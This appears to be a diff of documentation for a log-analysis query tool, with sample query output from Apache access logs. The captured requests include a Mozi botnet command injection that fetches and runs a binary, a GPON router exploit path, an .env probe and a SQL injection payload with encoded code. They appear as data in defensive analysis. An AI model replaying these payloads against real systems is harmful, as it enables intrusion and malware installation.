@@ -31,6 +31,36 @@ LIST(src:'sas://remote/logs/apache/$yyyy$/$MM$/$dd$/$yyyy$-$MM$-$dd$_*access.log
 | `34.239.156.212` | 34.239.156.212 | *null* | *null* | `2020‑07‑29 17:50:14.000 +0300` | GET  | /config/.env |         1.1 | *null*         |      404 |  2320 | ‑        | curl/7.69.1 | *null* |
 ....
 
+### ./query_clientip_metainfo.sx
+```jsx
+@[./view/view_default.sx]
+| select(clientIp, cc(clientIp), asname(clientIp), geo(clientIp), *)
+```
+
+| clientIp          | cc | asname                          | geo               | host            | ident  | auth   | timestamp                       | verb | uri                                                                                           | httpversion | invalidRequest | response | bytes | referrer                  | agent                                                                                                               | extra  |
+|-------------------|----|---------------------------------|-------------------|-----------------|--------|--------|---------------------------------|------|-----------------------------------------------------------------------------------------------|------------:|----------------|---------:|------:|---------------------------|---------------------------------------------------------------------------------------------------------------------|--------|
+| `96.126.103.73`   | US | AS63949 Linode, LLC             | 37.5625,‑122.0004 | 96.126.103.73   | *null* | *null* | `2020‑06‑01 06:22:30.000 +0300` | GET  | /                                                                                             |         1.1 | *null*         |      200 |   238 | ‑                         | Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36      | *null* |
+| `134.119.218.243` | DE | AS29066 Host Europe GmbH        | 51.2993,9.491     | 134.119.218.243 | *null* | *null* | `2020‑06‑01 07:01:30.000 +0300` | GET  | /                                                                                             |         1.1 | *null*         |      200 |   257 | http://www.ifconfig.co.uk | Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36       | *null* |
+| `162.243.143.216` | US | AS14061 DIGITALOCEAN‑ASN        | 37.7353,‑122.3732 | 162.243.143.216 | *null* | *null* | `2020‑06‑01 07:42:43.000 +0300` | GET  | /manager/text/list                                                                            |         1.1 | *null*         |      404 |   437 | ‑                         | Mozilla/5.0 zgrab/0.x                                                                                               | *null* |
+| `134.119.218.243` | DE | AS29066 Host Europe GmbH        | 51.2993,9.491     | 134.119.218.243 | *null* | *null* | `2020‑06‑01 07:52:36.000 +0300` | GET  | /                                                                                             |         1.1 | *null*         |      200 |   257 | http://www.ifconfig.co.uk | Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36       | *null* |
+| `185.172.111.210` | NL | AS206898 Server Hosting Pty Ltd | 52.3824,4.8995    | 185.172.111.210 | *null* | *null* | `2020‑06‑01 08:05:34.000 +0300` | POST | /GponForm/diag_Form?style/                                                                    |         1.1 | *null*         |      404 |  1989 | ‑                         | curl/7.3.2                                                                                                          | *null* |
+| `223.149.176.156` | CN | AS4134 Chinanet                 | 25.2239,112.1703  | 223.149.176.156 | *null* | *null* | `2020‑06‑01 08:10:23.000 +0300` | GET  | /shell?cd+/tmp;rm+‑rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws |         1.1 | *null*         |      404 |   493 | ‑                         | Hello, world                                                                                                        | *null* |
+...
+
+### ./query_by_keyword.sx
+```jsx
+@[./view/view_default.sx]
+| filter(_raw_text like '%union select%')
+```
+
+| clientIp         | host           | ident  | auth   | timestamp                       | verb | uri                       | httpversion | invalidRequest | response | bytes | referrer                                                                                                                                                                                                                                                                            | agent                                                                         | extra  |
+|------------------|----------------|--------|--------|---------------------------------|------|---------------------------|------------:|----------------|---------:|------:|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------|--------|
+| `175.126.145.10` | 175.126.145.10 | *null* | *null* | `2020‑06‑04 02:39:27.000 +0300` | POST | /%75%73%65%72%2e%70%68%70 |         1.1 | *null*         |      404 |   492 | 554fcae493e564ee0dc75bdf2ebf94caads\|a:3:{s:2:"id";s:3:"'/*";s:3:"num";s:141:"*/ union select 1,0x272F2A,3,4,5,6,7,8,0x7b247b24524345275d3b6469652f2a2a2f286d6435284449524543544f52595f534550415241544f5229293b2f2f7d7d,0‑‑";s:4:"name";s:3:"ads";}554fcae493e564ee0dc75bdf2ebf94ca | Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0 | *null* |
+| `106.54.4.180`   | 106.54.4.180   | *null* | *null* | `2020‑06‑05 12:38:07.000 +0300` | POST | /%75%73%65%72%2e%70%68%70 |         1.1 | *null*         |      404 |   492 | 554fcae493e564ee0dc75bdf2ebf94caads\|a:3:{s:2:"id";s:3:"'/*";s:3:"num";s:141:"*/ union select 1,0x272F2A,3,4,5,6,7,8,0x7b247b24524345275d3b6469652f2a2a2f286d6435284449524543544f52595f534550415241544f5229293b2f2f7d7d,0‑‑";s:4:"name";s:3:"ads";}554fcae493e564ee0dc75bdf2ebf94ca | Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0 | *null* |
+| `45.83.254.66`   | 45.83.254.66   | *null* | *null* | `2020‑06‑09 14:54:21.000 +0300` | POST | /%75%73%65%72%2e%70%68%70 |         1.1 | *null*         |      404 |   492 | 554fcae493e564ee0dc75bdf2ebf94caads\|a:3:{s:2:"id";s:3:"'/*";s:3:"num";s:141:"*/ union select 1,0x272F2A,3,4,5,6,7,8,0x7b247b24524345275d3b6469652f2a2a2f286d6435284449524543544f52595f534550415241544f5229293b2f2f7d7d,0‑‑";s:4:"name";s:3:"ads";}554fcae493e564ee0dc75bdf2ebf94ca | Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0  | *null* |
+...
+
+
 ### ./query_hits_by_status_range.sx
 ```jsx
 @[./view/view_default.sx]
@@ -55,22 +85,6 @@ LIST(src:'sas://remote/logs/apache/$yyyy$/$MM$/$dd$/$yyyy$-$MM$-$dd$_*access.log
 | `2020‑06‑03 00:00:00.000 +0300` |   114 |         88 |          0 |         88 |          0 |         26 |          0 |          22.81 |
 | `2020‑06‑04 00:00:00.000 +0300` |  1091 |         80 |          0 |         80 |          0 |       1010 |          1 |          92.58 |
 | `2020‑06‑05 00:00:00.000 +0300` |  1098 |        101 |          0 |        101 |          0 |        996 |          1 |          90.71 |
-...
-
-### ./query_clientip_metainfo.sx
-```jsx
-@[./view/view_default.sx]
-| select(clientIp, cc(clientIp), asname(clientIp), geo(clientIp), *)
-```
-
-| clientIp          | cc | asname                          | geo               | host            | ident  | auth   | timestamp                       | verb | uri                                                                                           | httpversion | invalidRequest | response | bytes | referrer                  | agent                                                                                                               | extra  |
-|-------------------|----|---------------------------------|-------------------|-----------------|--------|--------|---------------------------------|------|-----------------------------------------------------------------------------------------------|------------:|----------------|---------:|------:|---------------------------|---------------------------------------------------------------------------------------------------------------------|--------|
-| `96.126.103.73`   | US | AS63949 Linode, LLC             | 37.5625,‑122.0004 | 96.126.103.73   | *null* | *null* | `2020‑06‑01 06:22:30.000 +0300` | GET  | /                                                                                             |         1.1 | *null*         |      200 |   238 | ‑                         | Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36      | *null* |
-| `134.119.218.243` | DE | AS29066 Host Europe GmbH        | 51.2993,9.491     | 134.119.218.243 | *null* | *null* | `2020‑06‑01 07:01:30.000 +0300` | GET  | /                                                                                             |         1.1 | *null*         |      200 |   257 | http://www.ifconfig.co.uk | Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36       | *null* |
-| `162.243.143.216` | US | AS14061 DIGITALOCEAN‑ASN        | 37.7353,‑122.3732 | 162.243.143.216 | *null* | *null* | `2020‑06‑01 07:42:43.000 +0300` | GET  | /manager/text/list                                                                            |         1.1 | *null*         |      404 |   437 | ‑                         | Mozilla/5.0 zgrab/0.x                                                                                               | *null* |
-| `134.119.218.243` | DE | AS29066 Host Europe GmbH        | 51.2993,9.491     | 134.119.218.243 | *null* | *null* | `2020‑06‑01 07:52:36.000 +0300` | GET  | /                                                                                             |         1.1 | *null*         |      200 |   257 | http://www.ifconfig.co.uk | Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36       | *null* |
-| `185.172.111.210` | NL | AS206898 Server Hosting Pty Ltd | 52.3824,4.8995    | 185.172.111.210 | *null* | *null* | `2020‑06‑01 08:05:34.000 +0300` | POST | /GponForm/diag_Form?style/                                                                    |         1.1 | *null*         |      404 |  1989 | ‑                         | curl/7.3.2                                                                                                          | *null* |
-| `223.149.176.156` | CN | AS4134 Chinanet                 | 25.2239,112.1703  | 223.149.176.156 | *null* | *null* | `2020‑06‑01 08:10:23.000 +0300` | GET  | /shell?cd+/tmp;rm+‑rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws |         1.1 | *null*         |      404 |   493 | ‑                         | Hello, world                                                                                                        | *null* |
 ...
 
 ### ./query_top_countries.sx
